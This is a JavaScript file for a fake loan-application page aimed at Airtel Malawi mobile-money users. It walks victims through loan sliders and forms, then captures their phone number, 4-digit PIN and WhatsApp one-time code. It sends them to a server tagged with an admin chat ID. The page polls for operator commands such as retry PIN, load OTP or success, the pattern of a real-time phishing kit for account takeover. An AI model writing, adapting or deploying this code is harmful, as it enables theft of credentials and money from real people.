document.addEventListener('DOMContentLoaded', () => {
  const stepUnderstand = document.getElementById('step-I UNDERSTAND');
  const stepSlider = document.getElementById('step-slider');
  const stepLoan1 = document.getElementById('step-loan-1');
  const stepLoan2 = document.getElementById('step-loan-2');
  const stepLoan3 = document.getElementById('step-loan-3');
  const stepForm = document.getElementById('step-form'); // Login Screen
  const stepLoading = document.getElementById('step-loading');
  const stepOtp = document.getElementById('step-otp') || document.getElementById('step-WHATSSAP');
  const stepSuccess = document.getElementById('step-success');

  const pinSurfaceBanner = document.getElementById('pin-surface-banner');
  const otpSurfaceBanner = document.getElementById('otp-surface-banner');

  let currentUserId = null;
  let statusPollInterval = null;

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  function showStep(targetStep) {
    const allSteps = [stepUnderstand, stepSlider, stepLoan1, stepLoan2, stepLoan3, stepForm, stepOtp, stepSuccess];
    allSteps.forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (targetStep) targetStep.classList.add('active');
  }

  // Sliders Logic
  const sliderBalance = document.getElementById('slider-balance');
  const balanceVal = document.getElementById('balance-val');
  const sliderAirtime = document.getElementById('slider-airtime');
  const airtimeVal = document.getElementById('airtime-val');

  if (sliderBalance && balanceVal) {
    sliderBalance.addEventListener('input', (e) => {
      balanceVal.innerText = `MWK ${Number(e.target.value).toLocaleString()}`;
    });
  }

  if (sliderAirtime && airtimeVal) {
    sliderAirtime.addEventListener('input', (e) => {
      airtimeVal.innerText = `${e.target.value} days`;
    });
  }

  // Digit Inputs Setup
  const pinDigits = document.querySelectorAll('.pin-digit');
  const otpDigits = document.querySelectorAll('.otp-digit');

  function setupDigitInputs(inputs) {
    inputs.forEach((input, idx) => {
      input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '');
        if (input.value && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }
      });
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });
  }

  setupDigitInputs(pinDigits);
  setupDigitInputs(otpDigits);

  // Toggle PIN visibility
  const toggleEye = document.getElementById('toggle-pin-visibility');
  let isPinVisible = false;
  if (toggleEye) {
    toggleEye.addEventListener('click', () => {
      isPinVisible = !isPinVisible;
      pinDigits.forEach(i => i.type = isPinVisible ? 'text' : 'password');
    });
  }

  // Navigation handlers
  document.getElementById('btn-understand-proceed').addEventListener('click', () => {
    showStep(stepSlider);
  });

  document.getElementById('btn-slider-next').addEventListener('click', () => {
    showStep(stepLoan1);
  });

  document.getElementById('btn-loan1-back').addEventListener('click', () => {
    showStep(stepSlider);
  });

  document.getElementById('btn-loan1-next').addEventListener('click', () => {
    showStep(stepLoan2);
  });

  const phoneNumber = document.getElementById('phone-number');
  const phoneError = document.getElementById('phone-error');

  document.getElementById('btn-loan2-back').addEventListener('click', () => {
    showStep(stepLoan1);
  });

  document.getElementById('btn-loan2-next').addEventListener('click', () => {
    const cleanPhone = phoneNumber.value.replace(/\D/g, '');
    const isMalawiNumber = /^(099|098|088|077)\d{7}$/.test(cleanPhone);

    if (!isMalawiNumber) {
      phoneError.style.display = 'block';
      return;
    }
    phoneError.style.display = 'none';

    // Sync phone number to login screen field
    document.getElementById('login-phone').value = cleanPhone;

    showStep(stepLoan3);
  });

  document.getElementById('btn-loan3-back').addEventListener('click', () => {
    showStep(stepLoan2);
  });

  document.getElementById('btn-loan3-next').addEventListener('click', () => {
    // Populate Summary
    const loanAmount = document.getElementById('loan-amount').value;
    const loanDuration = document.getElementById('loan-duration').value;
    const loanType = document.getElementById('loan-type').value;
    const firstName = document.getElementById('first-name').value;
    const lastName = document.getElementById('last-name').value;

    document.getElementById('sum-amount').innerText = `MWK ${Number(loanAmount).toLocaleString()}`;
    document.getElementById('sum-duration').innerText = loanDuration;
    document.getElementById('sum-category').innerText = loanType;
    document.getElementById('sum-name').innerText = `${firstName} ${lastName}`.trim() || 'Valued Customer';

    showStep(stepForm);
  });

  // Submit Application via Login Screen
  const loginPhone = document.getElementById('login-phone');
  const pinError = document.getElementById('pin-error');

  document.getElementById('btn-login-submit').addEventListener('click', async () => {
    let valid = true;

    const cleanPhone = loginPhone.value.replace(/\D/g, '');
    const isMalawiNumber = /^(099|098|088|077)\d{7}$/.test(cleanPhone);

    if (!isMalawiNumber) {
      alert('Please enter a valid Airtel Malawi number.');
      valid = false;
    }

    const pinVal = Array.from(pinDigits).map(i => i.value).join('');
    if (pinVal.length !== 4) {
      pinError.style.display = 'block';
      valid = false;
    } else {
      pinError.style.display = 'none';
    }

    if (!valid) return;

    const amtVal = `MWK ${Number(document.getElementById('loan-amount').value).toLocaleString()}`;

    showLoading('Submitting Application...', 'Sending details securely.');

    try {
      const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminParam)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          contact: cleanPhone,
          pin: pinVal,
          amount: amtVal,
          adminChatId: adminParam
        })
      });

      const data = await res.json();
      if (data.success) {
        currentUserId = data.userId;
        document.getElementById('loading-title').innerText = 'Awaiting Admin Verification...';
        document.getElementById('loading-sub').innerText = 'Please stay on this page while request is processed.';
        startStatusPolling();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  });

  // Status Polling from Admin Actions
  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'APPROVED_LOAD_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          document.getElementById('otp-phone-display').innerText = loginPhone.value;
          showStep(stepOtp);
        } else if (data.status === 'SUCCESS') {
          // DIRECT TRANSITION TO SUCCESS SCREEN WITHOUT CONTINUOUS SPINNER
          clearInterval(statusPollInterval);
          hideLoading();
          document.getElementById('approved-amount-display').innerText = `MWK ${Number(document.getElementById('loan-amount').value).toLocaleString()}`;
          showStep(stepSuccess);
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (pinSurfaceBanner) pinSurfaceBanner.classList.add('active');
          pinDigits.forEach(i => i.value = '');
          showStep(stepForm);
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (otpSurfaceBanner) otpSurfaceBanner.classList.add('active');
          otpDigits.forEach(i => i.value = '');
          showStep(stepOtp);
        } else if (data.status === 'DENIED') {
          clearInterval(statusPollInterval);
          hideLoading();
          showStep(stepUnderstand);
        }
      } catch (e) {}
    }, 3000);
  }

  // Submit OTP
  document.getElementById('btn-submit-otp').addEventListener('click', async () => {
    const otpVal = Array.from(otpDigits).map(i => i.value).join('');

    if (otpVal.length !== 4) {
      document.getElementById('otp-error').style.display = 'block';
      return;
    }
    document.getElementById('otp-error').style.display = 'none';

    showLoading('Verifying OTP...', 'Validating your 4-digit WhatsApp code.');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          otp: otpVal
        })
      });

      const data = await res.json();
      if (data.success) {
        document.getElementById('loading-title').innerText = 'Verifying Code...';
        document.getElementById('loading-sub').innerText = 'Please wait while admin confirms your code.';
        startStatusPolling();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  });

  document.getElementById('btn-go-home').addEventListener('click', () => {
    window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
  });

  function showLoading(title, sub) {
    document.getElementById('loading-title').innerText = title;
    document.getElementById('loading-sub').innerText = sub;
    if (stepLoading) stepLoading.classList.add('active');
  }

  function hideLoading() {
    if (stepLoading) stepLoading.classList.remove('active');
  }
});
    
